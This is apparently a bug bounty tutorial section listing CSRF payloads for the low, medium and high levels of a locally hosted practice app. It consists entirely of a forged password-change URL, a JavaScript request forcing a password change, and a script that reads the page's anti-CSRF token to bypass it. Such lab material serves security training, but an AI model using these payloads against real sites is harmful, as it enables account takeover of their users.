# bug-bounty-tutorial
bug bounty tutorial

## 8.CSRF-Advanced

### low
```
http://127.0.0.1:42001/vulnerabilities/csrf/?password_new=123456&password_conf=123456&Change=Change#
```

### medium
```
const HttpRequest = new XMLHttpRequest();
const url ="http://127.0.0.1:42001/vulnerabilities/csrf/?password_new=password&password_conf=password&Change=Change#";
HttpRequest.open("GET", url);
HttpRequest.send();
```

### high
```
const user_token=document.getElementsByName("user_token")[0].value;
var payload ="http://127.0.0.1:42001/vulnerabilities/csrf/?password_new=password&password_conf=password&Change=Change&user_token="+user_token;
var second_request = new XMLHttpRequest();
second_request.open("GET", payload);
second_request.send()

```
